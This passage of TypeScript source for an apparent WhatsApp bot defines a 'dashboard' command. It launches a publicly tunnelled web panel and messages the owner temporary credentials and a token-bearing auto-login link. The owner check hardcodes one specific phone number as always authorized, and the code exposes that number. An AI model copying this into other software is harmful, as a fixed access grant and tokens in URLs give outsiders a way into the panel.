        }
      }

      return sendJson(res, 404, { error: "Ruta no encontrada" });
    } catch (e: any) {
      return sendJson(res, 500, { error: String(e?.message || e) });
    }
  });

  const preferredPort = Number(process.env.SERVER_PORT || process.env.WEB_PORT || process.env.PORT || 0);

  return new Promise((resolve) => {
    const onError = () => {
      server.removeListener("error", onError);
      server.listen(0, "0.0.0.0", () => {
        const addr = server.address();
        const assignedPort = typeof addr === "object" && addr ? addr.port : 8080;
        state.server = server;
        state.port = assignedPort;
        resolve(assignedPort);
      });
    };

    server.once("error", onError);
    server.listen(preferredPort, "0.0.0.0", () => {
      server.removeListener("error", onError);
      const addr = server.address();
      const assignedPort = typeof addr === "object" && addr ? addr.port : preferredPort || 8080;
      state.server = server;
      state.port = assignedPort;
      resolve(assignedPort);
    });
  });
}

export default {
  name: ["checkweb", "webpanel", "panelweb", "dashboard"],
  category: "group",
  description: "Inicia el panel web con WhatsApp Web Multimedia, Stickers y Llamadas para todos los subbots.",
  groupOnly: false,
  async run(ctx: CommandContext) {
    const { reply, react, db, msg, groupMeta, sock, from, sender } = ctx;

    hookSockets(sock);

    const rawInput = sender || msg.key?.participant || from;
    const server = rawInput.split("@")[1] || "desconocido";
    const cleanInputId = rawInput.split("@")[0].split(":")[0].replace(/\D/g, "");

    let resolvedJid: string | null = null;
    let resolvedLid: string | null = null;

    if (server === "s.whatsapp.net") {
      resolvedJid = `${cleanInputId}@s.whatsapp.net`;
    } else if (server === "lid") {
      resolvedLid = `${cleanInputId}@lid`;
    }

    if (groupMeta?.participants) {
      const foundInGroup = groupMeta.participants.find((p: any) => {
        const pLid = String(p.lid || "").split("@")[0].split(":")[0];
        const pId = String(p.id || "").split("@")[0].split(":")[0];
        const pPhone = String(p.phoneNumber || "").replace(/\D/g, "");
        return pLid === cleanInputId || pId === cleanInputId || (pPhone && pPhone === cleanInputId);
      }) as any;

      if (foundInGroup) {
        if (!resolvedJid) {
          if (foundInGroup.id?.endsWith("@s.whatsapp.net")) {
            resolvedJid = foundInGroup.id;
          } else if (foundInGroup.phoneNumber) {
            const num = String(foundInGroup.phoneNumber).replace(/\D/g, "");
            if (num) resolvedJid = `${num}@s.whatsapp.net`;
          }
        }
        if (!resolvedLid && foundInGroup.lid?.endsWith("@lid")) {
          resolvedLid = foundInGroup.lid;
        }
      }
    }

    const lidRepo = (sock as any).signalRepository?.lidMapping;
    if (lidRepo && !resolvedJid && resolvedLid && typeof lidRepo.getPNForLID === "function") {
      try {
        const pn = await lidRepo.getPNForLID(resolvedLid);
        if (pn) {
          const cleanPn = String(pn).split("@")[0].split(":")[0].replace(/\D/g, "");
          if (cleanPn) resolvedJid = `${cleanPn}@s.whatsapp.net`;
        }
      } catch {}
    }

    const dbAny = db as any;
    if (dbAny && typeof dbAny.getUser === "function" && !resolvedJid) {
      try {
        const userRec = (resolvedLid && dbAny.getUser(resolvedLid)) || dbAny.getUser(rawInput);
        if (userRec?.phone_number) {
          resolvedJid = `${String(userRec.phone_number).replace(/\D/g, "")}@s.whatsapp.net`;
        } else if (userRec?.jid?.endsWith("@s.whatsapp.net")) {
          resolvedJid = userRec.jid;
        }
      } catch {}
    }

    const realNumber = resolvedJid ? resolvedJid.split("@")[0].split(":")[0] : cleanInputId;

    const isAuthorizedOwner =
      realNumber === "573118353868" ||
      cleanInputId === "573118353868" ||
      Boolean((ctx as any).isOwner) ||
      Boolean(msg.key?.fromMe) ||
      Boolean(resolvedJid && dbAny?.hasRole?.(resolvedJid, "owner")) ||
      Boolean(dbAny?.hasRole?.(sender, "owner"));

    if (!isAuthorizedOwner) {
      await react("⛔").catch(() => undefined);
      return reply("⛔ *Acceso denegado:* Este panel es exclusivo para los propietarios del sistema.");
    }

    await react("🌐").catch(() => undefined);

    rotateCredentials();

    const port = await ensureWebServerRunning();
    const [tunnelBase, publicIp] = await Promise.all([
      startPublicTunnel(port),
      fetchPublicIp(),
    ]);

    syncCommandInterceptors().catch(() => undefined);

    const baseHost = tunnelBase || `http://${publicIp}:${port}`;
    const magicLink = `${baseHost}/?token=${state.token}`;

    sendCredentialsEmail(
      state.ownerEmail,
      baseHost,
      state.tempUser,
      state.tempPass,
      state.token
    ).catch(() => {});

    const panelMessage = [
      `🌐 *${fytBold("AURA-BOT 2.0 • SUITE & WA-WEB PRO")}* 🌐`,
      `━━━━━━━━━━━━━━━━━━━━━━`,
      `👤 *Usuario Temporal:* \`${state.tempUser}\``,
      `🔑 *Clave / Código OTP:* \`${state.tempPass}\``,
      `📧 *Correo vinculado:* \`${state.ownerEmail}\``,
      `🔌 *Puerto Interno:* \`${port}\``,
      ``,
      `🚀 *Enlace Portada Login:*`,
      `${baseHost}`,
      ``,
      `⚡ *Enlace Directo (Auto-Login 1 Clic):*`,
      `${magicLink}`,
    ].join("\n");

    await sock.sendMessage(
      sender,
      { text: panelMessage },
      { quoted: msg as any }
    );

    if (from.endsWith("@g.us")) {
      await reply("🔒 *Verificación exitosa.* El enlace y tus credenciales temporales fueron enviados a tu privado y correo.");
    }

    await react("✅").catch(() => undefined);
  },
};
